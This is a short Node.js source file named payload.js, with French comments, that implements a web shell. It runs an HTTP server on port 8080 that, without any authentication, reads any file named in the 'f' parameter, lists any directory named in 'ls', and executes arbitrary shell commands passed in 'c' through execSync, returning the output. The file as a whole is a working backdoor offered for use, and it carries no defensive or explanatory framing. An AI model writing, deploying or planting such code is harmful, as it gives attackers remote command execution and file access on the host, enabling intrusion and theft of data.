// fichier : payload.js

const fs = require('fs');
const child_process = require('child_process');
const http = require('http');
const url = require('url');

http.createServer((req, res) => {
    const query = url.parse(req.url, true).query;

    res.writeHead(200, {'Content-Type': 'text/plain'});

    // Affiche le contenu d'un fichier
    if (query.f) {
        try {
            res.end(fs.readFileSync(query.f, 'utf8'));
        } catch(e) {
            res.end('Erreur : ' + e.message);
        }
    }
    // Liste un dossier
    else if (query.ls) {
        try {
            res.end(JSON.stringify(fs.readdirSync(query.ls)));
        } catch(e) {
            res.end('Erreur : ' + e.message);
        }
    }
    // Exécute une commande
    else if (query.c) {
        try {
            const output = child_process.execSync(query.c, {encoding: 'utf8'});
            res.end(output);
        } catch(e) {
            res.end('Erreur : ' + e.message);
        }
    }
    else {
        res.end('Aucune action spécifiée');
    }

}).listen(8080, () => {
    console.log('Mini-shell Node.js actif sur le port 8080');
});
